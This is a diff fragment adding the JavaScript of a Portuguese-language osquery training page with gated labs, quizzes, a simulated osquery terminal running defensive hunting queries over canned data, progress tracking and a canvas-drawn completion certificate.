+  ${!labDone?`<div class="quiz-locked">🐺 Quiz bloqueado. Primeiro execute o lab obrigatório: <strong>${esc(l.lab)}</strong></div>`:''}
+  ${l.choices.map((c,i)=>`<button class="choice" data-ans="${i}" ${!labDone?'disabled style="opacity:.55;cursor:not-allowed"':''}>${String.fromCharCode(65+i)}. ${esc(c)}</button>`).join('')}
+  <p class="small" id="quizFeedback">${lessonQuizDone(id)?'✅ Quiz já validado. Você pode concluir o módulo se o lab também foi executado.':''}</p></div>
+  <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:14px">
+    <button class="howl-btn" id="labBtn">Executar lab obrigatório</button>
+    <button class="howl-btn" id="completeBtn">Concluir módulo</button>
+    <button class="howl-btn" id="nextBtn">Próximo</button>
+  </div>`;
+  $$('#lessonPanel [data-cmd]').forEach(b=>b.onclick=()=>sendToTerminal(b.dataset.cmd));
+  $$('#lessonPanel .choice').forEach(b=>{ if(b.dataset.q!==undefined){ b.onclick=()=>answerProgressive(id,parseInt(b.dataset.q),parseInt(b.dataset.ans),b);} else { b.onclick=()=>answer(id,parseInt(b.dataset.ans),b);} });
+  $('#labBtn').onclick=()=>sendToTerminal(l.lab);
+  $('#completeBtn').onclick=()=>completeLesson(id);
+  $('#nextBtn').onclick=()=>nextLesson();
+  save();
+}
+function answer(id,i,b){
+  const l=lessons.find(x=>x.id===id);
+  if(!lessonLabDone(id)){
+    toast('Execute o lab no terminal antes do quiz. Sem evidência, a resposta vira fanfic de SOC.');
+    return;
+  }
+  const right=correctIndex(l);
+  $$('#lessonPanel .choice').forEach(x=>x.classList.remove('correct','wrong'));
+  const fb=feedbackFor(l,i);
+  if(i===right){
+    b.classList.add('correct');
+    st.quiz=st.quiz||{};
+    st.quiz[id]=true;
+    $('#quizFeedback').textContent='✅ '+fb;
+  }else{
+    b.classList.add('wrong');
+    $('#quizFeedback').textContent='⚠️ '+fb;
+  }
+  save();
+}
+function completeLesson(id){
+  st.done=st.done||{};
+  st.labs=st.labs||{};
+  st.quiz=st.quiz||{};
+  if(!st.labs[id]){
+    toast('Não dá para concluir sem executar o lab no terminal. O lobo agradece auditoria baseada em achismo.');
+    sendToTerminal(lessons.find(x=>x.id===id).lab);
+    return;
+  }
+  if(!progressiveDone(id)){ toast('Responda corretamente as 5 questões progressivas do módulo antes de concluir.'); return;} if(!st.quiz[id]){
+    toast('Responda a validação técnica do módulo. A questão depende do resultado executado no terminal.');
+    return;
+  }
+  st.done[id]=true;
+  toast('Módulo concluído com evidência executada. O lobo perdeu mais uma camada de anonimato.');
+  save();
+  renderAll();
+  if(id<lessons.length)showLesson(id+1);else switchTab('certificado');
+}
+function nextLesson(){if(activeLesson<lessons.length){if(!st.done?.[activeLesson]){toast('Conclua o módulo atual antes de avançar. Pular etapa é coisa de atacante com pressa.');return}showLesson(activeLesson+1)}}
+function renderProgress(){const done=Object.keys(st.done||{}).length;const quiz=Object.values(st.quiz||{}).filter(Boolean).length;const labs=Object.keys(st.labs||{}).length;const pct=Math.round((done/lessons.length)*100);$('#doneCount').textContent=`${done}/${lessons.length}`;$('#scoreBox').textContent=`${Math.round(((done+quiz+labs)/(lessons.length*3))*100)}%`;$('#labsBox').textContent=labs;$('#certStatus').textContent=pct>=70?'✅':'🔒';$('#progressFill').style.width=pct+'%';$('#progressText').textContent=pct+'% concluído';const pm=$('#progressModules');if(pm){pm.innerHTML='';lessons.forEach(l=>{const d=document.createElement('div');d.className='module-card '+(st.done?.[l.id]?'done':'');d.innerHTML=`<span class="module-num">MÓDULO ${String(l.id).padStart(2,'0')}</span><span class="module-title">${esc(l.t)}</span><span class="module-desc">${st.done?.[l.id]?'Concluído':'Pendente'}</span>`;pm.appendChild(d)})}}
+function renderAll(){renderModules();renderLessonNav();renderProgress();drawCert(false)}
+function initTerm(){printTerm('<span class="t-comment">-- Be Safe .Inc | Floresta Digital | Host: VOVO-SRV-2009</span>');printTerm('<span class="t-comment">-- Digite help, .tables, .schema processes ou SELECT...</span>')}
+function printTerm(html){const b=$('#termBody');const d=document.createElement('div');d.className='term-line';d.innerHTML=html;b.appendChild(d);requestAnimationFrame(()=>{b.scrollTop=b.scrollHeight;});}
+function executeTerminal(){const input=$('#terminalInput');const raw=(input.value||'').trim();if(!raw){toast('Digite uma query primeiro. SELECT por telepatia ainda não foi aprovado.');input.focus();return}printTerm(`<span class="t-prompt">osquery&gt; </span><span class="t-cmd">${esc(raw)}</span>`);input.value='';runQuery(raw);const gh=terminalGuideHtml(raw);if(gh)printTerm(gh)}
+function sendToTerminal(cmd){const input=$('#terminalInput'); if(!input){toast('Terminal não encontrado.');return;} input.value=cmd; executeTerminal();}
+function runQuery(raw){const q=raw.trim().replace(/;$/,'');const lower=q.toLowerCase();if(lower==='clear'){$('#termBody').innerHTML='';initTerm();return}if(lower==='help'){printTerm('<span class="t-out">Comandos: .tables · .schema nome · SELECT colunas FROM tabela WHERE coluna LIKE "valor" LIMIT n · clear</span>');return}if(lower==='.tables'){printTerm('<span class="t-header">'+Object.keys(datasets).join(' · ')+'</span>');return}if(lower.startsWith('.schema')){const t=lower.split(/\s+/)[1];if(!datasets[t]){printTerm('<span class="t-bad">Tabela não encontrada. O lobo pode ser mau, mas o parser exige nome certo.</span>');return}printTable({cols:['column'],rows:datasets[t].cols.map(c=>[c])});return}let table=Object.keys(datasets).find(k=>new RegExp('from\\s+'+k+'\\b','i').test(q));if(!table){printTerm('<span class="t-bad">Query não reconhecida. Use SELECT ... FROM tabela. Gritar com o SQL não ajuda.</span>');return}let res=JSON.parse(JSON.stringify(datasets[table]));if(/join\s+processes/i.test(q)&&table==='process_open_sockets'){res={cols:['pid','name','path','cmdline','remote_address','remote_port'],rows:datasets.process_open_sockets.rows.map(s=>{const p=datasets.processes.rows.find(r=>r[0]===s[0])||['?','?','?','?','?'];return[s[0],p[2],p[3],p[4],s[1],s[2]]})}}if(/join\s+processes/i.test(q)&&table==='listening_ports'){res={cols:['pid','name','path','port'],rows:datasets.listening_ports.rows.map(lp=>{const p=datasets.processes.rows.find(r=>r[0]===lp[0])||['?','?','?','?','?'];return[lp[0],p[2],p[3],lp[1]]})}}if(/where/i.test(q))res.rows=filterRows(q,res);const lim=(q.match(/limit\s+(\d+)/i)||[])[1];if(lim)res.rows=res.rows.slice(0,parseInt(lim,10));printTable(res);const l=lessons.find(x=>norm(x.lab)===norm(raw));if(l){st.labs=st.labs||{};st.labs[l.id]=true;save();renderProgress();if(activeLesson===l.id)showLesson(l.id);toast('Lab obrigatório executado. Agora responda o quiz com base no resultado do terminal.')}}
+function norm(s){return String(s).toLowerCase().replace(/\s+/g,' ').replace(/;$/,'').trim()}
+function filterRows(q,res){let rows=res.rows;const like=[...q.matchAll(/([a-z_]+)\s+like\s+['"]([^'"]+)['"]/ig)];for(const m of like){const col=m[1],pat=m[2].replace(/%/g,'').toLowerCase(),idx=res.cols.indexOf(col);if(idx>=0)rows=rows.filter(r=>String(r[idx]).toLowerCase().includes(pat))}const eq=[...q.matchAll(/([a-z_]+)\s*=\s*['"]?([^'"\s]+)['"]?/ig)];for(const m of eq){const idx=res.cols.indexOf(m[1]);if(idx>=0)rows=rows.filter(r=>String(r[idx])===m[2])}if(/not\s+in\s*\(([^)]+)\)/i.test(q)){const m=q.match(/([a-z_]+)\s+not\s+in\s*\(([^)]+)\)/i);if(m){const idx=res.cols.indexOf(m[1]);const vals=m[2].split(',').map(x=>x.trim().replace(/["']/g,''));if(idx>=0)rows=rows.filter(r=>!vals.includes(String(r[idx])))}}return rows}
+function printTable(res){if(!res.rows.length){printTerm('<span class="t-bad">0 rows. A ausência de evidência também é dado… só não finja que é conclusão absoluta.</span>');return}let out='<div class="code-block"><span class="t-header">'+res.cols.join(' | ')+'</span>\n'+res.rows.map(r=>r.map(esc).join(' | ')).join('\n')+'</div>';printTerm(out)}
+function renderQuickbar(){const qs=['.tables','.schema processes','SELECT username,uid,directory FROM users;','SELECT pid,name,path FROM processes WHERE path LIKE "/tmp/%";','SELECT p.name,p.path,s.remote_address,s.remote_port FROM process_open_sockets s JOIN processes p ON p.pid=s.pid;','SELECT command,minute,hour FROM crontab;','SELECT path,sha256 FROM hash WHERE path="/tmp/.wolf/update";','clear'];$('#quickbar').innerHTML=qs.map(q=>`<button type="button" data-cmd="${esc(q)}">${esc(q.length>54?q.slice(0,54)+'...':q)}</button>`).join('');$$('#quickbar button').forEach(b=>b.onclick=()=>sendToTerminal(b.dataset.cmd))}
+function drawCert(showMsg=true){const c=$('#certCanvas'),ctx=c.getContext('2d');ctx.clearRect(0,0,c.width,c.height);const done=Object.keys(st.done||{}).length,pct=Math.round(done/lessons.length*100),ok=pct>=70&&st.name;ctx.fillStyle='#0b2a12';ctx.fillRect(0,0,c.width,c.height);ctx.strokeStyle='#c9a227';ctx.lineWidth=12;ctx.strokeRect(42,42,c.width-84,c.height-84);ctx.strokeStyle='rgba(240,192,64,.35)';ctx.lineWidth=3;ctx.strokeRect(78,78,c.width-156,c.height-156);ctx.textAlign='center';ctx.fillStyle='#f0c040';ctx.font='800 48px Cinzel, serif';ctx.fillText('CERTIFICADO DE CONCLUSÃO',c.width/2,155);ctx.font='700 28px Cinzel, serif';ctx.fillText('OSQUERY NA FLORESTA DA BE SAFE .INC',c.width/2,205);ctx.font='22px JetBrains Mono';ctx.fillStyle='#f5e6c8';ctx.fillText('Certificamos que',c.width/2,285);ctx.font='800 48px Cinzel, serif';ctx.fillStyle=ok?'#f0c040':'#8b6f27';ctx.fillText(st.name||'NOME OBRIGATÓRIO',c.width/2,350);ctx.font='22px JetBrains Mono';ctx.fillStyle='#f5e6c8';const txt=ok?'concluiu o curso prático de osquery, demonstrando competências em SQL para endpoint telemetry, hunting de processos, análise de persistência, correlação de rede, FIM, packs, osqueryd e investigação orientada por hipótese.':'Certificado bloqueado: registre o nome e conclua pelo menos 70% do curso.';wrap(ctx,txt,c.width/2,420,1050,34);ctx.font='20px JetBrains Mono';ctx.fillStyle='#f0c040';ctx.fillText(`Carga horária: 4h   ·   Aproveitamento: ${pct}%   ·   Data: ${new Date().toLocaleDateString('pt-BR')}`,c.width/2,650);ctx.fillText('Mariana BS — Cybersecurity Engineer',c.width/2,735);ctx.font='16px JetBrains Mono';ctx.fillStyle='rgba(245,230,200,.72)';ctx.fillText('Hash de emissão: BS-'+btoa((st.name||'anon')+'|'+pct).replace(/=/g,'').slice(0,16).toUpperCase(),c.width/2,785);$('#certNote').textContent=ok?'Certificado liberado para download em PNG.':'Certificado bloqueado: nome obrigatório e mínimo de 70%.';if(showMsg)toast(ok?'Certificado gerado. O lobo oficialmente perdeu no relatório.':'Ainda bloqueado. Nome e 70% são obrigatórios.')}function wrap(ctx,text,x,y,maxWidth,lineHeight){const words=text.split(' ');let line='';for(const w of words){const test=line+w+' ';if(ctx.measureText(test).width>maxWidth){ctx.fillText(line,x,y);line=w+' ';y+=lineHeight}else line=test}ctx.fillText(line,x,y)}function downloadCert(){if(!requireName())return;drawCert(false);const done=Object.keys(st.done||{}).length;if(Math.round(done/lessons.length*100)<70){toast('Certificado ainda bloqueado. Complete pelo menos 70%.');return}const a=document.createElement('a');a.download='certificado_osquery_be_safe.png';a.href=$('#certCanvas').toDataURL('image/png');a.click()}
+function setupVisuals(){const forest=$('#forestBg');for(let i=0;i<36;i++){const t=document.createElement('div');t.className='tree';const h=90+Math.random()*250,w=1+Math.random()*2,x=Math.random()*100,cw=22+Math.random()*52;t.style.cssText=`left:${x}%;height:${h}px;width:${w}px;opacity:${.25+Math.random()*.45}`;const cone=document.createElement('div');cone.style.cssText=`position:absolute;left:50%;transform:translateX(-50%);bottom:100%;width:0;height:0;border-left:${cw/2}px solid transparent;border-right:${cw/2}px solid transparent;border-bottom:${h*.5}px solid #071607`;t.appendChild(cone);forest.appendChild(t)}const stars=$('#starsEl');for(let i=0;i<75;i++){const s=document.createElement('div');s.className='star';const z=1+Math.random()*2;s.style.cssText=`left:${Math.random()*100}%;top:${Math.random()*64}%;width:${z}px;height:${z}px;--d:${2+Math.random()*4}s`;stars.appendChild(s)}}function howl(){toast('AUUUUU! O lobo ouviu uma query ruim e pediu revisão técnica.')} 
+
+function setupTerminalToggle(){
+  const btn=document.getElementById('terminalToggleBtn');
+  const box=document.getElementById('tab-terminal');
+  if(!btn || !box) return;
+  btn.onclick=function(ev){
+    ev.preventDefault();
+    box.classList.toggle('terminal-collapsed');
+    btn.textContent=box.classList.contains('terminal-collapsed')?'abrir':'recolher';
+  };
+}
+
+function init(){if(st.name)$('#studentName').value=st.name;setupVisuals();hydrateQuiz();initTerm();renderQuickbar();renderAll();showLesson(activeLesson);setupTerminalToggle();$$('.nav-tab').forEach(b=>b.onclick=()=>switchTab(b.dataset.tab));$('#saveNameBtn').onclick=saveName;$('#startBtn').onclick=()=>{if(!requireName())return;showLesson(activeLesson);switchTab('aula')};$('#terminalRunBtn').onclick=executeTerminal;$('#terminalInput').addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();executeTerminal()}});$('#genCertBtn').onclick=()=>{if(requireName())drawCert(true)};$('#downloadCertBtn').onclick=downloadCert;$('#wolfBtn').onclick=howl;}
+if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();
+</script>
+</body>
+</html>
